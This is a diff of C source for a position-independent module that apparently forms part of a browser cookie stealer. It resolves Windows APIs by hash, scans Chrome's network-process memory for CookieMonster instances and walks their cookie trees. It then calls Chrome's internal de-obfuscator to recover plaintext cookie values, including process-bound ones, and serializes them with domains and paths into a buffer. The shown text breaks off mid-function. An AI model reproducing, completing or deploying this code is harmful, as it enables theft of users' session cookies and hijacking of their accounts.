@@ -1,576 +1,522 @@
-#define PIC_CODE_SECTION_NAME ".text$F"
+#define CODE_SECTION_NAME ".text$F"
 #include "margaret.h"
 #include "chromium_adapter.h"
 #include "cc_layout.h"
-#include "pic_resolve.h"
+#include "resolve.h"
 
-/*
- * Engine A "netsvc-store": vtable-anchored CookieMonster discovery + map
- * walk + cookie serialization.  Runs in the network utility process.
- *
- * Nothing about the CanonicalCookie layout is pinned: every field
- * offset comes from the runtime calibrator in cc_layout.c.  Every
- * walk is bounded and every pointer dereference is validated.
- */
+/* Bounded CookieMonster discovery, traversal, and serialization. */
 
-typedef pic_u32 (PIC_MS_ABI *PIC_GET_TICK_COUNT_FN)(void);
+typedef DWORD (MS_ABI *PGET_TICK_COUNT_FN)(void);
 
-/* --- bounded memory copy with capacity check --- */
+/* Bounded output writers. */
 
-static PIC_CODE pic_bool engine_a_write_bytes(pic_u8 **cursor,
-                                               pic_u32 *remaining,
-                                               const pic_u8 *source,
-                                               pic_u32 length)
+static CODE_SECTION BOOL EngineAWriteBytes(PBYTE*cursor,
+                                               PDWORD remaining,
+                                               const BYTE *source,
+                                               DWORD length)
 {
     if (*remaining < length) {
-        return PIC_FALSE;
+        return FALSE;
     }
-    for (pic_u32 i = 0u; i < length; ++i) {
+    for (DWORD i = 0u; i < length; ++i) {
         (*cursor)[i] = source[i];
     }
     *cursor += length;
     *remaining -= length;
-    return PIC_TRUE;
+    return TRUE;
 }
 
-static PIC_CODE pic_bool engine_a_write_u32(pic_u8 **cursor,
-                                             pic_u32 *remaining,
-                                             pic_u32 value)
+static CODE_SECTION BOOL EngineAWriteU32(PBYTE*cursor,
+                                             PDWORD remaining,
+                                             DWORD value)
 {
     if (*remaining < 4u) {
-        return PIC_FALSE;
+        return FALSE;
     }
-    (*cursor)[0] = (pic_u8)(value & 0xFFu);
-    (*cursor)[1] = (pic_u8)((value >> 8u) & 0xFFu);
-    (*cursor)[2] = (pic_u8)((value >> 16u) & 0xFFu);
-    (*cursor)[3] = (pic_u8)((value >> 24u) & 0xFFu);
+    (*cursor)[0] = (BYTE)(value & 0xFFu);
+    (*cursor)[1] = (BYTE)((value >> 8u) & 0xFFu);
+    (*cursor)[2] = (BYTE)((value >> 16u) & 0xFFu);
+    (*cursor)[3] = (BYTE)((value >> 24u) & 0xFFu);
     *cursor += 4u;
     *remaining -= 4u;
-    return PIC_TRUE;
+    return TRUE;
 }
 
-/* --- CookieMonster tree walk --- */
+/* CookieMonster tree walk. */
 
-/* Whole-snapshot cap: the region scan stops at the next region
- * boundary once this many cookies are serialized (the current jar
- * usually yields far fewer; the cap bounds a pathological jar). */
+/* Whole-snapshot cookie cap. */
 #define MARGARET_MAX_COOKIES_TOTAL 4096u
-/* Per-instance walk bound (one CookieMonster map). */
+/* Per-map cookie cap. */
 #define MARGARET_MAX_COOKIES_PER_INSTANCE 4096u
 #define MARGARET_MAX_TREE_DEPTH 64u
-/* Instance cap; false-positive vtable hits are rejected by the walk
- * vetting without a dereference, the caller timeout bounds the scan. */
+/* Candidate-instance cap; the caller timeout bounds scanning. */
 #define MARGARET_MAX_INSTANCES 4096u
 
-/* The cookie's first qword is its vtable pointer, which lives inside
- * chrome.dll.  Any non-cookie garbage fails this and is skipped. */
-static PIC_CODE pic_bool engine_a_cookie_valid(const pic_u8 *cookie,
-                                                pic_uptr chrome_base,
-                                                pic_uptr chrome_size)
+/* Require each cookie vtable to point inside chrome.dll. */
+static CODE_SECTION BOOL EngineACookieValid(const BYTE *cookie,
+                                                ULONG_PTR chromeBase,
+                                                ULONG_PTR chromeSize)
 {
-    pic_uptr vtable;
-    if (!cc_ptr_plausible((pic_uptr)cookie)) {
-        return PIC_FALSE;
+    ULONG_PTR vtable;
+    if (!CcPtrPlausible((ULONG_PTR)cookie)) {
+        return FALSE;
     }
-    vtable = (pic_uptr)cc_read_u64(cookie);
-    return vtable >= chrome_base && vtable < chrome_base + chrome_size;
+    vtable = (ULONG_PTR)CcReadU64(cookie);
+    return vtable >= chromeBase && vtable < chromeBase + chromeSize;
 }
 
-/*
- * In-order successor for a libc++ __tree_node.
- * node layout: left at +0x00, right at +0x08, parent at +0x10.
- */
-static PIC_CODE pic_uptr engine_a_tree_next(const pic_u8 *node,
-                                             pic_uptr end_sentinel)
+/* libc++ tree successor; links are left, right, and parent. */
+static CODE_SECTION ULONG_PTR EngineATreeNext(const BYTE *node,
+                                             ULONG_PTR endSentinel)
 {
-    pic_uptr right;
-    pic_uptr current;
-    pic_uptr parent;
-    pic_u32 depth;
+    ULONG_PTR right;
+    ULONG_PTR current;
+    ULONG_PTR parent;
+    DWORD depth;
 
-    right = (pic_uptr)cc_read_u64(node + 0x08);
+    right = (ULONG_PTR)CcReadU64(node + 0x08);
     if (right != 0u) {
-        /* leftmost of right subtree */
-        if (!cc_ptr_plausible(right)) {
-            return 0u; /* malformed tree: stop this instance */
+        /* Leftmost node of the right subtree. */
+        if (!CcPtrPlausible(right)) {
+            return 0u; /* Malformed tree. */
         }
         current = right;
         for (depth = 0u; depth < MARGARET_MAX_TREE_DEPTH; ++depth) {
-            pic_uptr left = (pic_uptr)cc_read_u64((const pic_u8 *)current);
+            ULONG_PTR left = (ULONG_PTR)CcReadU64((const BYTE *)current);
             if (left == 0u) {
                 return current;
             }
-            if (!cc_ptr_plausible(left)) {
-                return 0u; /* malformed tree: stop this instance */
+            if (!CcPtrPlausible(left)) {
+                return 0u; /* Malformed tree. */
             }
             current = left;
         }
-        return 0u; /* bound exceeded: malformed tree */
+        return 0u; /* Depth exceeded. */
     }
 
-    /* go up until we came from the right */
-    current = (pic_uptr)node;
+    /* Ascend until leaving a left subtree. */
+    current = (ULONG_PTR)node;
     for (depth = 0u; depth < MARGARET_MAX_TREE_DEPTH; ++depth) {
-        parent = (pic_uptr)cc_read_u64((const pic_u8 *)current + 0x10);
-        if (parent == 0u || parent == end_sentinel) {
+        parent = (ULONG_PTR)CcReadU64((const BYTE *)current + 0x10);
+        if (parent == 0u || parent == endSentinel) {
             return 0u;
         }
-        if (!cc_ptr_plausible(parent)) {
-            return 0u; /* malformed tree: stop this instance */
+        if (!CcPtrPlausible(parent)) {
+            return 0u; /* Malformed tree. */
         }
         {
-            pic_uptr parent_left =
-                (pic_uptr)cc_read_u64((const pic_u8 *)parent);
-            /* the successor is the first ancestor reached from its
-             * LEFT subtree: current = parent's left child */
-            if (parent_left == current) {
+            ULONG_PTR parentLeft =
+                (ULONG_PTR)CcReadU64((const BYTE *)parent);
+            /* The first ancestor reached from its left child is next. */
+            if (parentLeft == current) {
                 return parent;
             }
         }
         current = parent;
     }
-    return 0u; /* bound exceeded */
+    return 0u; /* Depth exceeded. */
 }
 
-/* --- cookie serialization --- */
+/* Cookie serialization. */
 
-/*
- * Serialize one CanonicalCookie into the output buffer.
- * Format: [name_len][name][domain_len][domain][path_len][path]
- *         [value_len][value]
- *         [creation(8)][expiry(8)][flags(4)][same_site(4)][port(4)]
- * The value is the PLAINTEXT from CanonicalCookie::Value() (the
- * de-obfuscating accessor; a direct call, no callback involved).
- * Atomic: the full size is computed first; if it does not fit, nothing is
- * written (the caller can rely on cookie_count == number of whole cookies).
- */
-#define MARGARET_CC_FIXED_BYTES 32u /* value_len+creation+expiry+flags+samesite+port */
+/* Serialize one complete cookie in the format declared by margaret.h. */
+#define MARGARET_CC_FIXED_BYTES 32u /* Fixed fields after value. */
 
-typedef void (PIC_MS_ABI *PIC_COOKIE_VALUE_FN)(void *out, void *cookie);
+typedef void (MS_ABI *PCOOKIE_VALUE_FN)(PVOID out, PVOID cookie);
 
-static PIC_CODE pic_bool engine_a_serialize_cookie(
-    const pic_u8 *cookie,
-    pic_u8 **cursor,
-    pic_u32 *remaining,
-    const pic_u8 *chrome_base,
-    pic_uptr deobf_fn,
-    const PIC_CC_LAYOUT *lay,
-    PIC_FLAGS_CAL *flags_cal)
+static CODE_SECTION BOOL EngineASerializeCookie(
+    const BYTE *cookie,
+    PBYTE*cursor,
+    PDWORD remaining,
+    const BYTE *chromeBase,
+    ULONG_PTR deobfFn,
+    const CC_LAYOUT *lay,
+    FLAGS_CAL *flagsCal)
 {
-    PIC_CC_STRING_VIEW name;
-    PIC_CC_STRING_VIEW domain;
-    PIC_CC_STRING_VIEW path;
-    PIC_CC_STRING_VIEW value;
-    pic_u32 total;
+    CC_STRING_VIEW name;
+    CC_STRING_VIEW domain;
+    CC_STRING_VIEW path;
+    CC_STRING_VIEW value;
+    DWORD total;
 
-    if (cookie == PIC_NULL || lay == PIC_NULL ||
-        lay->calibrated != 1u) {
-        return PIC_FALSE;
+    if (cookie == NULL || lay == NULL ||
+        lay->Calibrated != 1u) {
+        return FALSE;
     }
 
-    /* strings at the calibrated offsets */
-    if (!cc_read_string(cookie + lay->off_name, &name) ||
-        !cc_read_string(cookie + lay->off_domain, &domain) ||
-        !cc_read_string(cookie + lay->off_path, &path)) {
-        return PIC_FALSE;
+    /* Read calibrated string fields. */
+    if (!CcReadString(cookie + lay->OffName, &name) ||
+        !CcReadString(cookie + lay->OffDomain, &domain) ||
+        !CcReadString(cookie + lay->OffPath, &path)) {
+        return FALSE;
     }
 
-    /* value: when the calibrated ProcessBound flag is set, the direct
-     * de-obfuscator call fn(rcx = &value_string, rdx = &out) writes
-     * the plaintext libc++ string into out */
-    value.data = PIC_NULL;
-    value.length = 0u;
-    if (deobf_fn != 0u && chrome_base != PIC_NULL &&
-        cookie[lay->off_flag] == 1u) {
-        pic_u8 out[24];
-        (void)margaret_memzero(out, sizeof(out));
-        ((PIC_COOKIE_VALUE_FN)deobf_fn)((void *)(cookie + lay->off_value),
+    /* De-obfuscate the ProcessBound value through its direct accessor. */
+    value.Data = NULL;
+    value.Length = 0u;
+    if (deobfFn != 0u && chromeBase != NULL &&
+        cookie[lay->OffFlag] == 1u) {
+        BYTE out[24];
+        (void)MargaretMemzero(out, sizeof(out));
+        ((PCOOKIE_VALUE_FN)deobfFn)((PVOID)(cookie + lay->OffValue),
                                         out);
-        (void)cc_read_string(out, &value);
+        (void)CcReadString(out, &value);
     }
 
-    /* atomic size check: no partial cookie may remain in the buffer */
-    total = 16u + name.length + domain.length + path.length + value.length +
+    /* Reject partial-cookie writes. */
+    total = 16u + name.Length + domain.Length + path.Length + value.Length +
             MARGARET_CC_FIXED_BYTES;
     if (*remaining < total) {
-        return PIC_FALSE;
+        return FALSE;
     }
 
-    /* write: lengths then data */
-    if (!engine_a_write_u32(cursor, remaining, name.length) ||
-        !engine_a_write_bytes(cursor, remaining, name.data, name.length) ||
-        !engine_a_write_u32(cursor, remaining, domain.length) ||
-        !engine_a_write_bytes(cursor, remaining, domain.data, domain.length) ||
-        !engine_a_write_u32(cursor, remaining, path.length) ||
-        !engine_a_write_bytes(cursor, remaining, path.data, path.length) ||
-        !engine_a_write_u32(cursor, remaining, value.length) ||
-        !engine_a_write_bytes(cursor, remaining, value.data, value.length)) {
-        return PIC_FALSE;
+    /* Write lengths followed by bytes. */
+    if (!EngineAWriteU32(cursor, remaining, name.Length) ||
+        !EngineAWriteBytes(cursor, remaining, name.Data, name.Length) ||
+        !EngineAWriteU32(cursor, remaining, domain.Length) ||
+        !EngineAWriteBytes(cursor, remaining, domain.Data, domain.Length) ||
+        !EngineAWriteU32(cursor, remaining, path.Length) ||
+        !EngineAWriteBytes(cursor, remaining, path.Data, path.Length) ||
+        !EngineAWriteU32(cursor, remaining, value.Length) ||
+        !EngineAWriteBytes(cursor, remaining, value.Data, value.Length)) {
+        return FALSE;
     }
 
-    /* creation/expiry at the calibrated Time offsets */
+    /* Write calibrated creation and expiry times. */
     {
-        pic_u8 time_buf[8];
-        pic_u64 t = cc_read_u64(cookie + lay->off_creation);
-        for (pic_u32 i = 0u; i < 8u; ++i) {
-            time_buf[i] = (pic_u8)((t >> (i * 8u)) & 0xFFu);
+        BYTE timeBuf[8];
+        ULONGLONG t = CcReadU64(cookie + lay->OffCreation);
+        for (DWORD i = 0u; i < 8u; ++i) {
+            timeBuf[i] = (BYTE)((t >> (i * 8u)) & 0xFFu);
         }
-        if (!engine_a_write_bytes(cursor, remaining, time_buf, 8u)) {
-            return PIC_FALSE;
+        if (!EngineAWriteBytes(cursor, remaining, timeBuf, 8u)) {
+            return FALSE;
         }
-        t = cc_read_u64(cookie + lay->off_expiry);
-        for (pic_u32 i = 0u; i < 8u; ++i) {
-            time_buf[i] = (pic_u8)((t >> (i * 8u)) & 0xFFu);
+        t = CcReadU64(cookie + lay->OffExpiry);
+        for (DWORD i = 0u; i < 8u; ++i) {
+            timeBuf[i] = (BYTE)((t >> (i * 8u)) & 0xFFu);
         }
-        if (!engine_a_write_bytes(cursor, remaining, time_buf, 8u)) {
-            return PIC_FALSE;
+        if (!EngineAWriteBytes(cursor, remaining, timeBuf, 8u)) {
+            return FALSE;
         }
     }
 
-    /* flags: calibrated secure_/httponly_ bools; evidence accrues
-     * cookie by cookie until the mask converges */
-    margaret_cc_flags_update(flags_cal, cookie,
-                              name.data, name.length);
-    if (!engine_a_write_u32(cursor, remaining,
-                            margaret_cc_flags_read(flags_cal, cookie))) {
-        return PIC_FALSE;
+    /* Refine and emit secure/httponly flags. */
+    MargaretCcFlagsUpdate(flagsCal, cookie,
+                              name.Data, name.Length);
+    if (!EngineAWriteU32(cursor, remaining,
+                            MargaretCcFlagsRead(flagsCal, cookie))) {
+        return FALSE;
     }
 
-    /* same_site / source_port at the calibrated pair (0 when the
-     * bounded pattern did not validate) */
-    if (!engine_a_write_u32(cursor, remaining,
-                            lay->off_same_site != 0u
-                                ? cc_read_u32(cookie + lay->off_same_site)
+    /* Emit validated same-site and port fields, or zero. */
+    if (!EngineAWriteU32(cursor, remaining,
+                            lay->OffSameSite != 0u
+                                ? CcReadU32(cookie + lay->OffSameSite)
                                 : 0u) ||
-        !engine_a_write_u32(cursor, remaining,
-                            lay->off_port != 0u
-                                ? cc_read_u32(cookie + lay->off_port)
+        !EngineAWriteU32(cursor, remaining,
+                            lay->OffPort != 0u
+                                ? CcReadU32(cookie + lay->OffPort)
                                 : 0u)) {
-        return PIC_FALSE;
+        return FALSE;
     }
 
-    return PIC_TRUE;
+    return TRUE;
 }
 
-/* --- discovery + walk + serialize (main Engine A entry) --- */
+/* Discover, walk, and serialize. */
 
-PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
-    PIC_CONTEXT *ctx,
+CODE_SECTION DWORD MS_ABI MargaretEngineASnapshot(
+    RESOLVER_CONTEXT *ctx,
     const MARGARET_CHROMIUM_ADAPTER *adapter,
     MARGARET_ARGS *args)
 {
-    void *kernel32_base;
-    PIC_CC_VQ_FN virtual_query;
-    PIC_GET_TICK_COUNT_FN get_tick_count;
-    pic_u8 *cursor;
-    pic_u32 remaining;
-    pic_u32 cookie_count;
-    pic_u32 instance_count;
-    pic_u32 status;
-    pic_uptr scan_end_addr;
-    pic_uptr last_hit_addr;
-    PIC_FLAGS_CAL flags_cal;
-    PIC_CC_LAYOUT cc_layout;
-    const pic_u8 *cal_sample[CAL_SAMPLE_MAX];
-    pic_u32 cal_n;
-    pic_u32 cal_diag;
-    pic_u8 layout_failed;
-    pic_uptr deobf_fn;
-    const pic_u8 *chrome_base;
-    pic_u32 chrome_size;
+    PVOID kernel32Base;
+    PVIRTUAL_QUERY_FN virtualQuery;
+    PGET_TICK_COUNT_FN getTickCount;
+    PBYTE cursor;
+    DWORD remaining;
+    DWORD cookieCount;
+    DWORD instanceCount;
+    DWORD status;
+    ULONG_PTR scanEndAddr;
+    ULONG_PTR lastHitAddr;
+    FLAGS_CAL flagsCal;
+    CC_LAYOUT ccLayout;
+    const BYTE *calSample[CAL_SAMPLE_MAX];
+    DWORD calN;
+    DWORD calDiag;
+    BYTE layoutFailed;
+    ULONG_PTR deobfFn;
+    const BYTE *chromeBase;
+    DWORD chromeSize;
 
-    if (ctx == PIC_NULL || adapter == PIC_NULL || args == PIC_NULL) {
-        return (pic_u32)MARGARET_STATUS_BAD_ARGUMENT;
+    if (ctx == NULL || adapter == NULL || args == NULL) {
+        return (DWORD)MargaretStatusBadArgument;
     }
-    if (args->output_buffer == PIC_NULL || args->output_capacity < 32u) {
-        args->output_length = 32u;
-        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
-        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
+    if (args->OutputBuffer == NULL || args->OutputCapacity < 32u) {
+        args->OutputLength = 32u;
+        args->Status = (DWORD)MargaretStatusBufferTooSmall;
+        return (DWORD)MargaretStatusBufferTooSmall;
     }
 
-    /* resolve VirtualQuery from kernel32.dll */
+    /* Resolve VirtualQuery. */
     {
-        PIC_HASH k32 = MARGARET_MODULE_HASH_KERNEL32_DLL;
-        PIC_HASH vq = MARGARET_HASH_VIRTUALQUERY;
-        PIC_HASH gtc = MARGARET_HASH_GETTICKCOUNT;
-        if (pic_find_module(ctx, &k32, &kernel32_base) !=
-            PIC_RESOLVE_OK) {
-            ctx->last_error = (pic_u32)PIC_RESOLVE_MODULE_NOT_FOUND;
-            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
-            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
+        API_HASH k32 = MARGARET_MODULE_HASH_KERNEL32_DLL;
+        API_HASH vq = MARGARET_HASH_VIRTUALQUERY;
+        API_HASH gtc = MARGARET_HASH_GETTICKCOUNT;
+        if (FindModule(ctx, &k32, &kernel32Base) !=
+            ResolveStatusOk) {
+            ctx->LastError = (DWORD)ResolveStatusModuleNotFound;
+            args->Status = (DWORD)MargaretStatusInternalError;
+            return (DWORD)MargaretStatusInternalError;
         }
-        if (pic_resolve_export(ctx, kernel32_base, &vq,
-                               (void **)&virtual_query) != PIC_RESOLVE_OK) {
-            ctx->last_error = (pic_u32)PIC_RESOLVE_EXPORT_NOT_FOUND;
-            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
-            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
+        if (ResolveExport(ctx, kernel32Base, &vq,
+                               (PVOID*)&virtualQuery) != ResolveStatusOk) {
+            ctx->LastError = (DWORD)ResolveStatusExportNotFound;
+            args->Status = (DWORD)MargaretStatusInternalError;
+            return (DWORD)MargaretStatusInternalError;
         }
-        if (pic_resolve_export(ctx, kernel32_base, &gtc,
-                               (void **)&get_tick_count) != PIC_RESOLVE_OK) {
-            ctx->last_error = (pic_u32)PIC_RESOLVE_EXPORT_NOT_FOUND;
-            args->status = (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
-            return (pic_u32)MARGARET_STATUS_INTERNAL_ERROR;
+        if (ResolveExport(ctx, kernel32Base, &gtc,
+                               (PVOID*)&getTickCount) != ResolveStatusOk) {
+            ctx->LastError = (DWORD)ResolveStatusExportNotFound;
+            args->Status = (DWORD)MargaretStatusInternalError;
+            return (DWORD)MargaretStatusInternalError;
         }
     }
 
-    scan_end_addr = 0u;
-    last_hit_addr = 0u;
-    cursor = (pic_u8 *)args->output_buffer;
-    remaining = args->output_capacity;
+    scanEndAddr = 0u;
+    lastHitAddr = 0u;
+    cursor = (PBYTE)args->OutputBuffer;
+    remaining = args->OutputCapacity;
 
-    /* write header (fixed 32 bytes): magic + counts + scan diagnostics */
-    if (!engine_a_write_u32(&cursor, &remaining, MARGARET_ENGINE_A_MAGIC)) {
-        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
-        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
+    /* Write the fixed 32-byte header. */
+    if (!EngineAWriteU32(&cursor, &remaining, MARGARET_ENGINE_A_MAGIC)) {
+        args->Status = (DWORD)MargaretStatusBufferTooSmall;
+        return (DWORD)MargaretStatusBufferTooSmall;
     }
-    /* placeholders: cookie_count, instance_count, scan_end (2 u32),
-     * last_hit (2 u32), reserved -- patched at the end */
-    if (!engine_a_write_u32(&cursor, &remaining, 0u) ||
-        !engine_a_write_u32(&cursor, &remaining, 0u) ||
-        !engine_a_write_u32(&cursor, &remaining, 0u) ||
-        !engine_a_write_u32(&cursor, &remaining, 0u) ||
-        !engine_a_write_u32(&cursor, &remaining, 0u) ||
-        !engine_a_write_u32(&cursor, &remaining, 0u) ||
-        !engine_a_write_u32(&cursor, &remaining, 0u)) {
-        args->status = (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
-        return (pic_u32)MARGARET_STATUS_BUFFER_TOO_SMALL;
+    /* Reserve count and scan-diagnostic fields. */
+    if (!EngineAWriteU32(&cursor, &remaining, 0u) ||
+        !EngineAWriteU32(&cursor, &remaining, 0u) ||
+        !EngineAWriteU32(&cursor, &remaining, 0u) ||
+        !EngineAWriteU32(&cursor, &remaining, 0u) ||
+        !EngineAWriteU32(&cursor, &remaining, 0u) ||
+        !EngineAWriteU32(&cursor, &remaining, 0u) ||
+        !EngineAWriteU32(&cursor, &remaining, 0u)) {
+        args->Status = (DWORD)MargaretStatusBufferTooSmall;
+        return (DWORD)MargaretStatusBufferTooSmall;
     }
 
-    cookie_count = 0u;
-    instance_count = 0u;
+    cookieCount = 0u;
+    instanceCount = 0u;
     {
-        PIC_FLAGS_CAL flags_cal_init;
-        flags_cal_init.candidates = FLAGS_ALL_CAND;
-        flags_cal_init.window_base = 0u;
-        flags_cal_init.calibrated = 0u;
-        flags_cal_init.secure_off = 0u;
-        flags_cal = flags_cal_init;
+        FLAGS_CAL flagsCalInit;
+        flagsCalInit.Candidates = FLAGS_ALL_CAND;
+        flagsCalInit.WindowBase = 0u;
+        flagsCalInit.Calibrated = 0u;
+        flagsCalInit.SecureOff = 0u;
+        flagsCal = flagsCalInit;
     }
-    (void)margaret_memzero(&cc_layout, sizeof(cc_layout));
-    cal_n = 0u;
-    cal_diag = 0u;
-    layout_failed = 0u;
-    status = (pic_u32)MARGARET_STATUS_OK;
+    (void)MargaretMemzero(&ccLayout, sizeof(ccLayout));
+    calN = 0u;
+    calDiag = 0u;
+    layoutFailed = 0u;
+    status = (DWORD)MargaretStatusOk;
 
-    /* discover chrome.dll base */
+    /* Locate chrome.dll. */
     {
-        if (!margaret_locate_chrome_dll(ctx, (void **)&chrome_base,
-                                        &chrome_size)) {
-            args->status = (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
-            return (pic_u32)MARGARET_STATUS_UNSUPPORTED_BUILD;
+        if (!MargaretLocateChromeDll(ctx, (PVOID*)&chromeBase,
+                                        &chromeSize)) {
+            args->Status = (DWORD)MargaretStatusUnsupportedBuild;
+            return (DWORD)MargaretStatusUnsupportedBuild;
         }
-        args->flags = 20u; /* engine: module re-located */
+        args->Flags = 20u; /* Module located. */
 
-        deobf_fn = 0u;
-        if (adapter->rva_canonical_cookie_deobfuscator != 0u) {
-            deobf_fn = (pic_uptr)chrome_base +
-                       adapter->rva_canonical_cookie_deobfuscator;
+        deobfFn = 0u;
+        if (adapter->RvaCanonicalCookieDeobfuscator != 0u) {
+            deobfFn = (ULONG_PTR)chromeBase +
+                       adapter->RvaCanonicalCookieDeobfuscator;
         }
 
-        /* vtable address (relocated at runtime) */
+        /* Compute the relocated vtable address. */
         {
-            const pic_u8 *vtable_ptr =
-                chrome_base + adapter->rva_cookie_monster_vtable;
-            pic_u64 vtable_va = (pic_u64)(pic_uptr)vtable_ptr;
+            const BYTE *vtablePtr =
+                chromeBase + adapter->RvaCookieMonsterVtable;
+            ULONGLONG vtableVa = (ULONGLONG)(ULONG_PTR)vtablePtr;
 
-            /* bounded committed-memory scan for CookieMonster instances */
-            PIC_CC_MBI mbi;
-            /* Full-range scan from the null page up.  The vtable VA also
-             * appears as transient copies on thread stacks (high
-             * addresses, past the image) and in low heaps; those hits
-             * are cheap because the walk vetting rejects them without a
-             * dereference, and the scan stops at the first cookie. */
-            pic_uptr address = 0x10000u;
-            /* No byte budget: the caller's timeout bounds the scan, but
-             * it is evaluated BETWEEN regions -- one region's inner
-             * scan (max 256 MB below) cannot be interrupted, so the
-             * effective bound can overshoot timeout_ms by seconds.  The
-             * low-level scan is cheap in-process and the CM heap sits
-             * at a high entropy address, far past where a fixed byte
-             * budget expires. */
-            pic_bool stop = PIC_FALSE;
-            pic_u32 start_ticks = get_tick_count();
-            pic_u32 timeout_ms = args->timeout_ms;
+            /* Scan committed memory for CookieMonster instances. */
+            MEMORY_BASIC_INFORMATION mbi;
+            /* Scan the full user range; candidate walks reject stray hits. */
+            ULONG_PTR address = 0x10000u;
+            /* Check timeout between regions; each region is capped below. */
+            BOOL stop = FALSE;
+            DWORD startTicks = getTickCount();
+            DWORD timeoutMs = args->TimeoutMs;
             while (!stop &&
-                   instance_count < MARGARET_MAX_INSTANCES &&
-                   cookie_count < MARGARET_MAX_COOKIES_TOTAL &&
-                   (timeout_ms == 0u ||
-                    (pic_u32)(get_tick_count() - start_ticks) <= timeout_ms)) {
-                pic_uptr region_size;
+                   instanceCount < MARGARET_MAX_INSTANCES &&
+                   cookieCount < MARGARET_MAX_COOKIES_TOTAL &&
+                   (timeoutMs == 0u ||
+                    (DWORD)(getTickCount() - startTicks) <= timeoutMs)) {
+                ULONG_PTR regionSize;
 
-                if (virtual_query((const void *)address, &mbi,
+                if (virtualQuery((PCVOID)address, &mbi,
                                    sizeof(mbi)) == 0u) {
                     break;
                 }
-                region_size = mbi.RegionSize;
-                if (region_size == 0u) {
+                regionSize = mbi.RegionSize;
+                if (regionSize == 0u) {
                     break;
                 }
 
                 {
-                    pic_u32 mbi_state = cc_read_u32(
-                        (const pic_u8 *)&mbi + MBI_OFF_STATE);
-                    pic_u32 mbi_protect = cc_read_u32(
-                        (const pic_u8 *)&mbi + MBI_OFF_PROTECT);
-                    if (mbi_state == MEM_COMMIT &&
-                        (mbi_protect & 0xEEu) != 0u && /* readable+exec */
-                        (mbi_protect & PAGE_GUARD) == 0u) {
-                        /* scan this region for qwords == vtable_va */
-                        const pic_u8 *region =
-                            (const pic_u8 *)mbi.BaseAddress;
-                        /* bound the region scan: clamp the full 64-bit
-                         * RegionSize BEFORE the cast -- (pic_u32)region_size
-                         * alone would wrap for committed regions above 4 GB
-                         * and silently skip the whole region instead of
-                         * scanning its first 256 MB */
-                        pic_u32 region_u32;
+                    DWORD mbiState = CcReadU32(
+                        (const BYTE *)&mbi + MBI_OFF_STATE);
+                    DWORD mbiProtect = CcReadU32(
+                        (const BYTE *)&mbi + MBI_OFF_PROTECT);
+                    if (mbiState == MEM_COMMIT &&
+                        (mbiProtect & 0xEEu) != 0u && /* Readable or executable. */
+                        (mbiProtect & PAGE_GUARD) == 0u) {
+                        /* Scan this region for the vtable address. */
+                        const BYTE *region =
+                            (const BYTE *)mbi.BaseAddress;
+                        /* Clamp RegionSize before narrowing to 32 bits. */
+                        DWORD regionU32;
 
-                        if (region_size > 256u * 1024u * 1024u) {
-                            region_u32 = 256u * 1024u * 1024u;
+                        if (regionSize > 256u * 1024u * 1024u) {
+                            regionU32 = 256u * 1024u * 1024u;
                         } else {
-                            region_u32 = (pic_u32)region_size;
+                            regionU32 = (DWORD)regionSize;
                         }
 
-                    /* 8-byte aligned scan */
-                    for (pic_u32 offset = 0u;
+                    /* Scan aligned qwords. */
+                    for (DWORD offset = 0u;
                          !stop &&
-                         offset + 8u <= region_u32 &&
-                         instance_count < MARGARET_MAX_INSTANCES;
+                         offset + 8u <= regionU32 &&
+                         instanceCount < MARGARET_MAX_INSTANCES;
                          offset += 8u) {
-                        if (cc_read_u64(region + offset) == vtable_va) {
-                            pic_uptr instance_addr =
-                                (pic_uptr)(region + offset);
+                        if (CcReadU64(region + offset) == vtableVa) {
+                            ULONG_PTR instanceAddr =
+                                (ULONG_PTR)(region + offset);
 
-                            /* skip hits inside chrome.dll (rdata pointers) */
-                            if (instance_addr >= (pic_uptr)chrome_base &&
-                                instance_addr < (pic_uptr)chrome_base + chrome_size) {
+                            /* Ignore pointers inside chrome.dll. */
+                            if (instanceAddr >= (ULONG_PTR)chromeBase &&
+                                instanceAddr < (ULONG_PTR)chromeBase + chromeSize) {
                                 continue;
                             }
 
-                            /* candidate instance (validated by the walk) */
-                            instance_count++;
-                            last_hit_addr = instance_addr;
+                            /* Validate this candidate through its map walk. */
+                            instanceCount++;
+                            lastHitAddr = instanceAddr;
 
-                            /* walk its cookie map */
+                            /* Walk the cookie map. */
                             {
-                                const pic_u8 *cm = (const pic_u8 *)instance_addr;
-                                PIC_CC_MBI vet_mbi;
-                                pic_uptr node = cc_read_u64(cm + 0x30);
-                                pic_uptr end_addr =
-                                    (pic_uptr)(cm + 0x38);
-                                pic_u32 node_count = 0u;
+                                const BYTE *cm = (const BYTE *)instanceAddr;
+                                MEMORY_BASIC_INFORMATION vetMbi;
+                                ULONG_PTR node = CcReadU64(cm + 0x30);
+                                ULONG_PTR endAddr =
+                                    (ULONG_PTR)(cm + 0x38);
+                                DWORD nodeCount = 0u;
 
-                                /* vet the untrusted begin node's region
-                                 * before trusting any byte of it */
-                                if (node != 0u && node != end_addr &&
-                                    !cc_region_ok(
-                                        (const void *)node, &vet_mbi,
-                                        virtual_query)) {
+                                /* Vet the first node before dereferencing it. */
+                                if (node != 0u && node != endAddr &&
+                                    !CcRegionOk(
+                                        (PCVOID)node, &vetMbi,
+                                        virtualQuery)) {
                                     node = 0u;
                                 }
 
                                 while (!stop &&
                                        node != 0u &&
-                                       node != end_addr &&
-                                       node_count < MARGARET_MAX_COOKIES_PER_INSTANCE) {
-                                    const pic_u8 *cookie;
-                                    pic_uptr next_node;
+                                       node != endAddr &&
+                                       nodeCount < MARGARET_MAX_COOKIES_PER_INSTANCE) {
+                                    const BYTE *cookie;
+                                    ULONG_PTR nextNode;
 
-                                    /* the node itself must be a plausible
-                                     * heap pointer before we trust it */
-                                    if (!cc_ptr_plausible(node)) {
